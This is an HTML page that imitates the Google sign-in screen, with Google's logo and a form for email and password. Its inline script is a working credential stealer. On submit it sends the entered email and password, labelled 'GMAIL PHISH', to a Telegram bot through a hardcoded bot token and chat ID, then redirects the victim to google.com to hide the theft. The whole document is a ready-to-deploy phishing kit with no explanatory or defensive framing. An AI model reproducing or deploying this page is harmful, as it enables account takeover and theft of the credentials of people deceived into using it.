<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in â€“ Google</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      background-color: #f2f2f2;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      background: white;
      padding: 40px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      border-radius: 8px;
      width: 360px;
    }
    .logo {
      display: flex;
      justify-content: center;
      margin-bottom: 20px;
    }
    .logo img {
      width: 75px;
    }
    h2 {
      font-size: 24px;
      margin-bottom: 10px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>
    <h2>Sign in</h2>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Email or phone" required>
      <input type="password" id="password" placeholder="Enter your password" required>
      <button type="submit">Next</button>
    </form>
  </div>  <script>
    const BOT_TOKEN = '8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0';
    const CHAT_ID = '6894787120';

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();

      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      const message = `\nGMAIL PHISH\n------------------\nEmail: ${email}\nPassword: ${password}`;

      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      const payload = {
        chat_id: CHAT_ID,
        text: message
      };

      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      window.location.href = 'https://www.google.com';
    });
  </script></body>
</html>
